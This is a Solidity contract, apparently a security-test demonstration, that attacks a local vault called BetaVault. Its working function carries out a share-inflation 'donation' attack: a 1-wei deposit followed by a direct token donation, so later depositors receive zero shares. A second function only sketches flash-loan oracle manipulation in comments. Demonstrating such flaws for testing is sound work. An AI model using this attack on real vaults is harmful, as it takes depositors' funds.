// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./BetaVault.sol";

/**
 * @title FlashLoanAttacker
 * @notice Demonstrates flash loan attack on vulnerable vault
 */
contract FlashLoanAttacker {
    BetaVault public vault;
    IERC20 public asset;
    
    constructor(address _vault) {
        vault = BetaVault(_vault);
        asset = vault.asset();
    }
    
    /**
     * @notice Execute donation attack
     * @dev Steps:
     * 1. Attacker deposits 1 wei to get initial shares
     * 2. Attacker donates large amount directly to vault
     * 3. Share price inflates massively
     * 4. Next depositor gets rounded down to 0 shares
     */
    function executeDonationAttack(uint256 donationAmount) external {
        // Step 1: Deposit minimal amount
        asset.transferFrom(msg.sender, address(this), 1 + donationAmount);
        asset.approve(address(vault), 1);
        vault.deposit(1);
        
        // Step 2: Donate large amount directly
        asset.transfer(address(vault), donationAmount);
        
        // Now share price is inflated
        // Next small depositor will get 0 shares due to rounding
    }
    
    /**
     * @notice Simulate flash loan oracle manipulation
     * @dev This would integrate with actual flash loan provider
     */
    function simulateFlashLoanAttack(
        uint256 flashLoanAmount,
        address targetOracle
    ) external {
        // 1. Take flash loan
        // 2. Manipulate price oracle by swapping large amounts
        // 3. Use manipulated price to exploit vault
        // 4. Repay flash loan
        // 5. Keep profit
        
        // This is a simulation - actual implementation would need
        // integration with Aave, dYdX, or other flash loan providers
    }
}